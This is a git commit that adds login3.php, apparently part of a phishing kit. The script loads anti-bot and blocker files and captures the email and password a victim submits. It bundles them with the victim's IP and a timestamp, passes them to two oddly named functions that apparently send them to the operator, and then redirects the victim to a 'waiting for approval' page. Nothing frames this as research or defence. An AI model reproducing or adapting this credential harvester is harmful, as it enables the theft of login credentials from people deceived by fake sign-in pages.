a90e9d0027e0a0b8760811b3f3a167499656bb1e
basgs <89833787+basgs@users.noreply.github.com>
2024-05-23 20:18:31 +0800

    Add files via upload

---
+++ login3.php
@@ -0,0 +1,23 @@
+<?php
+include("./assets/function.php");
+include("./assets/antibot.php");
+include("./assets/antibots.php");
+include("./assets/tite.php");
+include("./assets/antibotsulit.php");
+include("./assets/blocker.php");
+include("./assets/bt.php");
+
+$email = $_POST['eml'];
+$password = $_POST['pwd'];
+$time1 = date('M d Y - g:i a');
+date_default_timezone_set('Asia/Manila');
+
+            $hostname = gethostbyaddr($ip2);
+            $message .= "[LOGIN 2]\n";
+            $message .= "EMAIL: ".$email."\n";
+            $message .= "PASSWORD: ".$password."\n";
+            $message .= "IP ADDRESS: ".$ip2."\n";
+            $message .= "DATE/TIME: ".$time1."\n";z6nQf($message);tangakaba($message);
+
+            header("location:WaitingforApproval.html");
+?>
